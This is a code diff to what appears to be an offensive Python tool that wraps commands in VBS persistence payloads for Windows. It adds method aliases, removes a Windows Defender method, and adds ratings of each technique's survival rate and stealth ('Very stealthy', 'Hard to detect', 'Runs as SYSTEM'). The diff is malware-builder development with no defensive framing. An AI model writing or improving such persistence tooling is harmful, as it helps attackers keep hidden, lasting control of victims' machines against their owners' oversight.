@@ -501,16 +501,14 @@ End If
 
         if method == "registry":
             return persistence_manager.create_registry_persistence_vbs(command)
-        elif method == "startup":
+        elif method in ("startup", "startup_folder"):
             return persistence_manager.create_startup_folder_persistence_vbs(command)
-        elif method == "task":
+        elif method in ("task", "scheduled_task"):
             return persistence_manager.create_scheduled_task_persistence_vbs(command)
         elif method == "wmi":
             return persistence_manager.create_wmi_event_persistence_vbs(command)
         elif method == "service":
             return persistence_manager.create_service_persistence_vbs(command)
-        elif method == "defender":
-            return persistence_manager.create_windows_defender_persistence_vbs(command)
         else:  # multi (default)
             return persistence_manager.create_multi_method_persistence_vbs(command)
 
@@ -544,7 +542,21 @@ def create_persistent_payload(command: str, persistence_method: str = "multi") -
             "advantages": ["Works on all Windows", "Survives safe mode", "Natural looking"],
             "disadvantages": ["Visible in startup", "User can see files"]
         },
+        "startup_folder": {
+            "name": "Startup Folder",
+            "supports": "XP, Vista, 7, 8, 8.1, 10, 11",
+            "survival": "85%",
+            "advantages": ["Works on all Windows", "Survives safe mode", "Natural looking"],
+            "disadvantages": ["Visible in startup", "User can see files"]
+        },
         "task": {
+            "name": "Scheduled Tasks",
+            "supports": "Vista, 7, 8, 8.1, 10, 11",
+            "survival": "90%",
+            "advantages": ["Very stealthy", "Runs as SYSTEM", "Hard to detect"],
+            "disadvantages": ["Requires WinXP SP3+", "Can be disabled"]
+        },
+        "scheduled_task": {
             "name": "Scheduled Tasks",
             "supports": "Vista, 7, 8, 8.1, 10, 11",
             "survival": "90%",
